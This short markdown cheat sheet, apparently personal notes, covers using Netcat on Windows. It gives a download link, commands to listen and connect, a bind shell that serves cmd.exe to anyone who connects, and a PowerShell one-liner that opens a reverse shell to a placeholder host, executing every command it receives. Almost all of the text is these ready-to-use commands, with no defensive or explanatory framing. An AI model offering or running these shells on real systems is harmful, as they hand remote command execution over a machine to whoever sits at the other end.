# Netcat

### Netcat download: https://eternallybored.org/misc/netcat/

Into your CMD to listen:
1. ``cd C:\Users\De Lucca\Downloads\netcat-win32-1.12`` => Path where your extracted netcat file is
2. ``nc.exe -lvp [Port]`` => Listen, Verbose, Port

Into your CMD to listen while executing CMD:
1. ``nc.exe -lvp [Port] -e "cmd.exe"``

Into your CMD to connect:
1. ``cd C:\Users\De Lucca\Downloads\netcat-win32-1.12`` => Path where your extracted netcat file is
2. ``nc.exe [IP] [Port]``

Into Powershell: <br>
``$sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",port)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}``
